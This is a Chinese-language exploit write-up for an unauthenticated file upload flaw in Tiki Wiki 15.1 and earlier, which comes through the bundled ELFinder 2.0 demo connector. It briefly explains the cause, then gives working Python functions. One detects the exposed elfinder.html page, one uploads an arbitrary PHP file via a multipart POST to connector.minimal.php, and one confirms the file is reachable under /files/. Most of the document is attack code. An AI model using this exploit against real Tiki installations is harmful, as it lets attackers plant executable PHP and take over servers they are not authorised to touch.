
# Tiki Wiki <=15.1 - Unauthenticated File Upload 

## 漏洞原理
**利用Tiki利用Tiki Wiki<=15.1中的文件上传漏洞，
漏洞来自tiki的第三方组件ELFinder -version 2.0
该组件带有一个默认的示例页面：包括上传、删除、重命名、创建目录等
并且该页面不强制进行文件扩展名、内容类型等验证。
因此，未经身份验证的用户也可以上传PHP文件。**

## exp编写
### 1. 检测漏洞是否存在
使用requests模块，http://docs.python-requests.org/zh_CN/latest/user/quickstart.html  
```python
def check(url, port):
    parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/elfinder.html']
    target_url = ''.join('%s' % part for part in parts)
    print(target_url)
    r = requests.get(target_url)
    if (r.status_code == 200):
        print("检测成功,开始攻击")
        return True
    else:
        print("未检测到")
        return False
```
### 2. 漏洞利用  
- 选择一个php文件上传然后抓包可得：
![mark](http://onc55v8te.bkt.clouddn.com/blog/20170423/104629854.png)
- 据此，使用requests库提交Multipart/form-data格式的数据，查看post部分
![mark](http://onc55v8te.bkt.clouddn.com/blog/20170423/104720598.png)
- 据此构造参数
```python
files = {'cmd': (None, 'upload'),
             'target': (None, 'l1_XA'),
             'upload[]': (filename, open(filename, 'rb'), 'application/octet-stream')
             }
```
- 随后使用post方法提交
```python
def exploit(url, port, filename):
    parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/php/connector.minimal.php']
    target_url = ''.join('%s' % part for part in parts)
    files = {'cmd': (None, 'upload'),
             'target': (None, 'l1_XA'),
             'upload[]': (filename, open(filename, 'rb'), 'application/octet-stream')
             }
    r = requests.post(target_url, files=files)
```
### 3.检测是否上传成功
如果上传成功，会在/tiki/vendor_extra/elfinder/files/路径下找到上传的文件
```python
def check_success(url, port, filename):
    parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/files/', filename]

    target_url = ''.join('%s' % part for part in parts)
    r = requests.get(target_url)
    if (r.status_code == 200):
        print("上传成功~")
    else:
        print("上传失败")
```
